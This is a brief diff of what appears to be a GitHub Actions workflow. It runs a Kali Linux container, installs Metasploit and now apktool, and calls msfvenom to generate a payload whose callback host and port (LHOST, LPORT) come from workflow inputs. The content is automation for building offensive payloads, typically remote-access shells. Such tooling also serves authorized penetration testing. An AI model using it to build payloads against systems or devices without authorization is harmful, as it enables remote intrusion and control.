@@ -84,7 +84,7 @@ jobs:
             -u root \
             kalilinux/kali-rolling \
             bash -c "apt-get update && \
-                     apt-get install -y metasploit-framework && \
+                     apt-get install -y metasploit-framework apktool && \
                      msfvenom $PLATFORM $FORMAT_FLAG -p $PAYLOAD LHOST=${{ github.event.inputs.lhost }} LPORT=${{ github.event.inputs.lport }} -o '$OUTPUT_FILE'"
           
           
